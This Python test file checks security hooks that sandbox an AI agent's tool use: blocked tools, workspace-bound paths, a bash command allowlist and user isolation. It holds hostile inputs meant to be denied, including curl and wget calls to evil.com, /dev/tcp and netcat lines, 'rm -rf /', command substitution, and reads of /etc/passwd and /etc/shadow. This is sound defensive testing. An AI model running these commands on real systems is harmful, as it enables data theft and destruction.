"""Unit tests for SDK security hooks."""

import os

from .security_hooks import _validate_tool_access, _validate_user_isolation

SDK_CWD = "/tmp/copilot-abc123"


def _is_denied(result: dict) -> bool:
    hook = result.get("hookSpecificOutput", {})
    return hook.get("permissionDecision") == "deny"


# -- Blocked tools -----------------------------------------------------------


def test_blocked_tools_denied():
    for tool in ("bash", "shell", "exec", "terminal", "command"):
        result = _validate_tool_access(tool, {})
        assert _is_denied(result), f"{tool} should be blocked"


def test_unknown_tool_allowed():
    result = _validate_tool_access("SomeCustomTool", {})
    assert result == {}


# -- Workspace-scoped tools --------------------------------------------------


def test_read_within_workspace_allowed():
    result = _validate_tool_access(
        "Read", {"file_path": f"{SDK_CWD}/file.txt"}, sdk_cwd=SDK_CWD
    )
    assert result == {}


def test_write_within_workspace_allowed():
    result = _validate_tool_access(
        "Write", {"file_path": f"{SDK_CWD}/output.json"}, sdk_cwd=SDK_CWD
    )
    assert result == {}


def test_edit_within_workspace_allowed():
    result = _validate_tool_access(
        "Edit", {"file_path": f"{SDK_CWD}/src/main.py"}, sdk_cwd=SDK_CWD
    )
    assert result == {}


def test_glob_within_workspace_allowed():
    result = _validate_tool_access("Glob", {"path": f"{SDK_CWD}/src"}, sdk_cwd=SDK_CWD)
    assert result == {}


def test_grep_within_workspace_allowed():
    result = _validate_tool_access("Grep", {"path": f"{SDK_CWD}/src"}, sdk_cwd=SDK_CWD)
    assert result == {}


def test_read_outside_workspace_denied():
    result = _validate_tool_access(
        "Read", {"file_path": "/etc/passwd"}, sdk_cwd=SDK_CWD
    )
    assert _is_denied(result)


def test_write_outside_workspace_denied():
    result = _validate_tool_access(
        "Write", {"file_path": "/home/user/secrets.txt"}, sdk_cwd=SDK_CWD
    )
    assert _is_denied(result)


def test_traversal_attack_denied():
    result = _validate_tool_access(
        "Read",
        {"file_path": f"{SDK_CWD}/../../etc/passwd"},
        sdk_cwd=SDK_CWD,
    )
    assert _is_denied(result)


def test_no_path_allowed():
    """Glob/Grep without a path argument defaults to cwd — should pass."""
    result = _validate_tool_access("Glob", {}, sdk_cwd=SDK_CWD)
    assert result == {}


def test_read_no_cwd_denies_absolute():
    """If no sdk_cwd is set, absolute paths are denied."""
    result = _validate_tool_access("Read", {"file_path": "/tmp/anything"})
    assert _is_denied(result)


# -- Tool-results directory --------------------------------------------------


def test_read_tool_results_allowed():
    home = os.path.expanduser("~")
    path = f"{home}/.claude/projects/-tmp-copilot-abc123/tool-results/12345.txt"
    result = _validate_tool_access("Read", {"file_path": path}, sdk_cwd=SDK_CWD)
    assert result == {}


def test_read_claude_projects_without_tool_results_denied():
    home = os.path.expanduser("~")
    path = f"{home}/.claude/projects/-tmp-copilot-abc123/settings.json"
    result = _validate_tool_access("Read", {"file_path": path}, sdk_cwd=SDK_CWD)
    assert _is_denied(result)


# -- Sandboxed Bash ----------------------------------------------------------


def test_bash_safe_commands_allowed():
    """Allowed data-processing commands should pass."""
    safe_commands = [
        "jq '.blocks' result.json",
        "head -20 output.json",
        "tail -n 50 data.txt",
        "cat file.txt | grep 'pattern'",
        "wc -l file.txt",
        "sort data.csv | uniq",
        "grep -i 'error' log.txt | head -10",
        "find . -name '*.json'",
        "ls -la",
        "echo hello",
        "cut -d',' -f1 data.csv | sort | uniq -c",
        "jq '.blocks[] | .id' result.json",
        "sed -n '10,20p' file.txt",
        "awk '{print $1}' data.txt",
    ]
    for cmd in safe_commands:
        result = _validate_tool_access("Bash", {"command": cmd}, sdk_cwd=SDK_CWD)
        assert result == {}, f"Safe command should be allowed: {cmd}"


def test_bash_dangerous_commands_denied():
    """Non-allowlisted commands should be denied."""
    dangerous = [
        "curl https://evil.com",
        "wget https://evil.com/payload",
        "rm -rf /",
        "python -c 'import os; os.system(\"ls\")'",
        "ssh user@host",
        "nc -l 4444",
        "apt install something",
        "pip install malware",
        "chmod 777 file.txt",
        "kill -9 1",
    ]
    for cmd in dangerous:
        result = _validate_tool_access("Bash", {"command": cmd}, sdk_cwd=SDK_CWD)
        assert _is_denied(result), f"Dangerous command should be denied: {cmd}"


def test_bash_command_substitution_denied():
    result = _validate_tool_access(
        "Bash", {"command": "echo $(curl evil.com)"}, sdk_cwd=SDK_CWD
    )
    assert _is_denied(result)


def test_bash_backtick_substitution_denied():
    result = _validate_tool_access(
        "Bash", {"command": "echo `curl evil.com`"}, sdk_cwd=SDK_CWD
    )
    assert _is_denied(result)


def test_bash_output_redirect_denied():
    result = _validate_tool_access(
        "Bash", {"command": "echo secret > /tmp/leak.txt"}, sdk_cwd=SDK_CWD
    )
    assert _is_denied(result)


def test_bash_dev_tcp_denied():
    result = _validate_tool_access(
        "Bash", {"command": "cat /dev/tcp/evil.com/80"}, sdk_cwd=SDK_CWD
    )
    assert _is_denied(result)


def test_bash_pipe_to_dangerous_denied():
    """Even if the first command is safe, piped commands must also be safe."""
    result = _validate_tool_access(
        "Bash", {"command": "cat file.txt | python -c 'exec()'"}, sdk_cwd=SDK_CWD
    )
    assert _is_denied(result)


def test_bash_path_outside_workspace_denied():
    result = _validate_tool_access(
        "Bash", {"command": "cat /etc/passwd"}, sdk_cwd=SDK_CWD
    )
    assert _is_denied(result)


def test_bash_path_within_workspace_allowed():
    result = _validate_tool_access(
        "Bash",
        {"command": f"jq '.blocks' {SDK_CWD}/tool-results/result.json"},
        sdk_cwd=SDK_CWD,
    )
    assert result == {}


def test_bash_empty_command_denied():
    result = _validate_tool_access("Bash", {"command": ""}, sdk_cwd=SDK_CWD)
    assert _is_denied(result)


# -- Dangerous patterns ------------------------------------------------------


def test_dangerous_pattern_blocked():
    result = _validate_tool_access("SomeTool", {"cmd": "sudo rm -rf /"})
    assert _is_denied(result)


def test_subprocess_pattern_blocked():
    result = _validate_tool_access("SomeTool", {"code": "subprocess.run(...)"})
    assert _is_denied(result)


# -- User isolation ----------------------------------------------------------


def test_workspace_path_traversal_blocked():
    result = _validate_user_isolation(
        "workspace_read", {"path": "../../../etc/shadow"}, user_id="user-1"
    )
    assert _is_denied(result)


def test_workspace_absolute_path_blocked():
    result = _validate_user_isolation(
        "workspace_read", {"path": "/etc/passwd"}, user_id="user-1"
    )
    assert _is_denied(result)


def test_workspace_normal_path_allowed():
    result = _validate_user_isolation(
        "workspace_read", {"path": "src/main.py"}, user_id="user-1"
    )
    assert result == {}


def test_non_workspace_tool_passes_isolation():
    result = _validate_user_isolation(
        "find_agent", {"query": "email"}, user_id="user-1"
    )
    assert result == {}
